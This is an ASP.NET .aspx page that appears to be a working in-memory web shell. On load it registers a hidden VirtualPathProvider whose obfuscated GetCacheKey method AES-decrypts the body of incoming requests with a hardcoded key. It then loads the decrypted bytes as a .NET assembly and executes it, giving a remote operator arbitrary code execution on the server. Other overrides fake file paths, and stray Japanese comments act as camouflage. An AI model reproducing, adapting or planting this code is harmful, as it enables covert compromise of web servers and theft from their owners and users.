<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>
<script runat="server" language="c#">
public void Page_Load(){var a=typeof(System.Web.Compilation.BuildManager);var b=a.GetProperty("DebuggingEnabled",BindingFlags.Static|BindingFlags.NonPublic);if(b!=null){try{b.SetValue(null,true);}catch{}}HostingEnvironment.RegisterVirtualPathProvider(new c());}
public class c:VirtualPathProvider{public override string GetCacheKey(string a){int aa=0;object[] ab=new object[10];while(true){switch(aa){case 0:ab[0]=HttpContext.Current;if(ab[0]==null||((HttpContext)ab[0]).Request==null||((HttpContext)ab[0]).Request.Cookies.Count<=0){aa=99;}else{aa=1;}break;case 1:ab[1]=((HttpContext)ab[0]).Request.InputStream;if(((Stream)ab[1]).Length<=0){aa=99;}else{aa=2;}break;case 2:((Stream)ab[1]).Position=0;ab[2]=new byte[((Stream)ab[1]).Length];((Stream)ab[1]).Read((byte[])ab[2],0,((byte[])ab[2]).Length);aa=3;break;case 3:ab[3]=Encoding.ASCII.GetBytes("ca63457538b9b1e0");ab[4]=new RijndaelManaged();aa=4;break;case 4:((RijndaelManaged)ab[4]).KeySize=128;((RijndaelManaged)ab[4]).Key=(byte[])ab[3];((RijndaelManaged)ab[4]).IV=(byte[])ab[3];((RijndaelManaged)ab[4]).Mode=CipherMode.CBC;((RijndaelManaged)ab[4]).Padding=PaddingMode.PKCS7;aa=5;break;case 5:ab[5]=((RijndaelManaged)ab[4]).CreateDecryptor(((RijndaelManaged)ab[4]).Key,((RijndaelManaged)ab[4]).IV);using(MemoryStream ac=new MemoryStream((byte[])ab[2]))using(CryptoStream ad=new CryptoStream(ac,(ICryptoTransform)ab[5],CryptoStreamMode.Read))using(MemoryStream ae=new MemoryStream()){ad.CopyTo(ae);ab[6]=ae.ToArray();}aa=6;break;case 6:ab[7]=Assembly.Load((byte[])ab[6]);if((Assembly)ab[7]==null){aa=8;}else{ab[8]=((Assembly)ab[7]).CreateInstance("K");aa=7;}break;case 7:if(ab[8]!=null){ab[8].Equals(ab[0]);}aa=8;break;case 8:((HttpContext)ab[0]).Response.End();aa=99;break;case 99:return Previous.GetCacheKey(a);}}return Previous.GetCacheKey(a);}
// 月が綺麗ですね
public override bool FileExists(string a){a=a.ToLower();if(a.Contains(((char)(119)).ToString()))return true;return Previous.FileExists(a);}
// このコードは誰が書いたんだ？
public override VirtualFile GetFile(string a){a=a.ToLower();if(a.Contains("w"))return new d(a);return Previous.GetFile(a);}}
public class d:VirtualFile{private string p;public d(string a):base(a){p=a;}
// サーバーは満員です
public override Stream Open(){return new MemoryStream();}}
</script>